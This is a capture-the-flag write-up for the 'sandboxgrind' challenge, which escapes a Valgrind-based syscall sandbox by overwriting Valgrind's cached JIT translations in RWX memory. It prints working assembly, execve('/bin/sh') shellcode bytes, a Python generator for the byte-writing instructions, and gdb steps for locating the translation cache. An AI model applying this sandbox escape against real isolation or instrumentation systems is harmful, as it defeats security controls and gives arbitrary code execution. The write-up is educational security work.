sandboxgrind
=====

Points: 244 (32 solves)

Writeup Author: ath0

Files provided: `sandboxgrind-542f0d05188b7fa5.tar.xz `

Overview
=====

We are given a custom Valgrind "tool", implemented in "sandboxgrind.c".

I was already somewhat familiar with Valgrind and similar tools, but the Wikipedia page tells you what you need to know:

> Valgrind is in essence a virtual machine using **just-in-time (JIT) compilation** techniques, including dynamic recompilation. Nothing from the original program ever gets run directly on the host processor. Instead, Valgrind first translates the program into a temporary, simpler form called Intermediate Representation (IR), which is a processor-neutral, SSA-based form. **After the conversion, a tool (see below) is free to do whatever transformations it would like on the IR, before Valgrind translates the IR back into machine code and lets the host processor run it.** Valgrind recompiles binary code to run on host and target (or simulated) CPUs of the same architecture. 


So the program is translated into an IR, then in-essence recompiled back to machine code.

So what are the limitations of this sandbox?

```c
static void SB_(pre_clo_init)(void)
{
    VG_(details_name)("sandboxgrind");
    VG_(details_version)(NULL);
    VG_(details_description)("a valgrind sandbox");
    VG_(details_copyright_author)("Copyright (C) 2021 hxp");
    VG_(details_bug_reports_to)("#hxpctf");
    VG_(basic_tool_funcs)(SB_(post_clo_init), SB_(instrument), SB_(fini));
}
```

I don't know much about valgrind, but it seems that `SB_(instrument)` should be the main instrumentation function.

```c
static IRSB* SB_(instrument)(VgCallbackClosure *closure,
                             IRSB *bb,
                             const VexGuestLayout *layout,
                             const VexGuestExtents *vge,
                             const VexArchInfo *archinfo_host,
                             IRType gWordTy,
                             IRType hWordTy)
{
    IRSB* sbOut = deepCopyIRSBExceptStmts(bb);

    for (Int i = 0; i < bb->stmts_used; i++) {
        IRStmt* st = bb->stmts[i];
        switch (st->tag) {
        case Ist_Dirty:
            // Call to a C helper function
            SB_(instrument_dirty_call)(sbOut, st->Ist.Dirty.details->cee, st->Ist.Dirty.details->guard);
            break;
        case Ist_Exit:
            // (Conditional) exit from BB
            SB_(instrument_jump)(sbOut, st->Ist.Exit.jk, IRExpr_Const(st->Ist.Exit.dst), st->Ist.Exit.guard);
            break;
        default:
            break;
        }
        addStmtToIRSB(sbOut, st);
    }
    SB_(instrument_jump)(sbOut, bb->jumpkind, bb->next, NULL);
    return sbOut;
}
```

This doesn't do a whole lot, besides call SB_(instrument_jump) for every jump. And what does that do?

```c
static void SB_(instrument_jump)(IRSB *sbOut, IRJumpKind jk, IRExpr *dst, IRExpr *guard)
{
    switch (jk) {
    case Ijk_Boring:
    case Ijk_Call:
    case Ijk_Ret:
    case Ijk_Yield:
        return; // Ignore "normal" jumps and calls
    // For some reason, IRJumpKind has a ton of syscalls, but we don't allow any of them. Same goes
    // for any emulation errors and invalid instructions. We don't abort here, because they may still
    // be unreachable (we need to evaluate the guard expression first).
    default:
        SB_INSTRUMENT_FN(sbOut, SB_(illegal), guard, jk); // Abort on invalid instructions and emulation errors
        return;
    }
}
```

The comment is the most useful thing here. The goal of the sandbox is to filter out things like syscalls. 

So my initial thought is that since they are doing this sort of JIT recompilation thing,  there are probably one or more RWX pages where code is written and then subsequently executed.

There were about 3 different things I tried:

Idea 1: Compile with `-x execstack`... stack is now RWX... lets write code and jump there!
----

```assembly
mov eax, 1
mov rdi, 1
lea rsi, [rip+str]
mov rdx, 0x20
movabs r12, 0x050f
movq [rsp], r12

jmp rsp

str:
.string "Hello world!\n"
```

Output:
```
Encountered illegal operation: Sys_syscall
```

This doesn't work because the Valgrind VM gets a chance to translate the instructions again on every indirect jump. (It isn't doing static translation at program start.)

Idea 2: Self-modifying code
----

Maybe if we modify our code as its running, we can write a syscall after the tool ran, which would thus go undetected?

I'm not 100% sure why this doesn't work if you do it in a RWX region, but it doesn't.

```assembly
# setup regs for write(1, "Hello world", 0x20)
mov eax, 1
mov rdi, 1
lea rsi, [rip+str]
mov rdx, 0x20
movabs r12, 0x0f0000000005c766
movq [rsp], r12
movabs r12, 0xcc909005
movq [rsp+8], r12

jmp rsp

str:
.string "Hello world!\n"
```

The code we write on the stack (which is RWX) is:
```
0:  66 c7 05 00 00 00 00    mov    WORD PTR [rip+0x0],0x50f        # 0x9
7:  0f 05
9:  90                      nop
a:  90                      nop
b:  cc                      int3
```

That works outside of the sandbox, but not inside the sandbox (we get SIGINT)... I guess valgrind doesn't support doing self-modifying code like this.

Idea 3: Modify the post-translated code
----

This ended up working.

Valgrind *caches* translations. So the plan is:

1. Execute a benign block, it will get translated
2. Overwrite the cached translation with shellcode
3. Jump back to the benign block. The cache will be used.

First, I setup something like this:
```assembly
# This is our target basic block
# It gets executed once at start
cool:
movq rsi, 0xfaceb00b
jmp start2

start2:

# big loop so we can attach gdb 
mov rdi, 100000
loop:
decq rdi
jne loop

jmp cool

ret
```

The special constant will allow us to find the translation for the `cool:` block:

```
$ sudo gdb -p 251329

gef➤  search-pattern 0xfaceb00b
[+] Searching '\x0b\xb0\xce\xfa' in memory
[+] In '/home/andrew/hxp/sandboxgrind/solve/attempt1'(0x401000-0x402000), permission=r-x
  0x401002 - 0x401012  →   "\x0b\xb0\xce\xfa[...]" 
[+] In (0x1002001000-0x10026bc000), permission=rwx
  0x1002003400 - 0x1002003410  →   "\x0b\xb0\xce\xfa[...]" 
[+] In (0x1002b71000-0x1003af1000), permission=rwx
  0x1002d9d00a - 0x1002d9d01a  →   "\x0b\xb0\xce\xfa[...]" 
  0x1002d9d2f2 - 0x1002d9d302  →   "\x0b\xb0\xce\xfa[...]" 
gef➤  
```

Our constant was only found in three rwx locations. The bottom two are plausible: We can look at the disassembly:

```
Dump of assembler code from 0x1002d9d000 to 0x1002d9d010:
   0x0000001002d9d000:  dec    DWORD PTR [rbp+0x8]
   0x0000001002d9d003:  jns 0x1002d9d008
   0x0000001002d9d005:  jmp    QWORD PTR [rbp+0x0]
   0x0000001002d9d008:  movabs r10,0xfaceb00b

gef➤  disass 0x1002d9d2f0,+16
Dump of assembler code from 0x1002d9d2f0 to 0x1002d9d300:
   0x0000001002d9d2f0:  movabs r10, 0xfaceb00b
   0x0000001002d9d2fa:  mov    QWORD PTR [rbp+0x40],r10
   0x0000001002d9d2fe:  mov    r11,0x40100c
```


This even shows the translation at work... valgrind translated our instruction to use a different register (r10 instead of rsi in the original code)... interesting!

So lets just place our shellcode at these addresses and see what happens:

First, generate instructions to place shellcode byte-by-byte using:

```py
data = b"\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x48\x89\xE7\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\xB8\x3B\x00\x00\x00\x0F\x05"
for i, b in enumerate(data):
    print(f"mov byte ptr [r12+{i}], {hex(b)}")
```

Now the modified payload looks like:
```assembly
# This is our target basic block
# It gets executed once at start
cool:
movq rsi, 0xfaceb00b
jmp start2

start2:

# decreased the number of loop iterations here because we don't need to wait for GDB
mov rdi, 1000
loop:
decq rdi
jne loop

movabs r12, 0x0000001002d9d2f0

## PASTE SHELLCODE MOV SEQUENCE HERE ##
## e.g.
## mov byte ptr [r12+0], 0x48
## mov byte ptr [r12+1], 0xbf
## etc...

jmp cool

ret
```

Run it again and you'll get a shell!